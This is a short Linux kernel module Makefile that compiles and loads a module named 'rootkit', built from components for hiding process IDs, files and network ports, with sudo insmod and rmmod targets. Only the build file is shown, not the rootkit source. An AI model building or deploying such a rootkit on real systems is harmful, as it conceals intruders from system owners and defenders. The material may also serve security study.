TARGET = rootkit
obj-m := ${TARGET}ko.o
${TARGET}ko-objs := ${TARGET}.o hide_pid.o hide_file.o util.o hide_port.o


default:
	${MAKE} modules \
		--directory "/lib/modules/$(shell uname --release)/build" M="$(shell pwd)"

clean:
	${MAKE} clean \
		--directory "/lib/modules/$(shell uname --release)/build" M="$(shell pwd)"

insmod:
	sudo insmod ${TARGET}ko.ko
	
rmmod:
	sudo rmmod ${TARGET}ko.ko
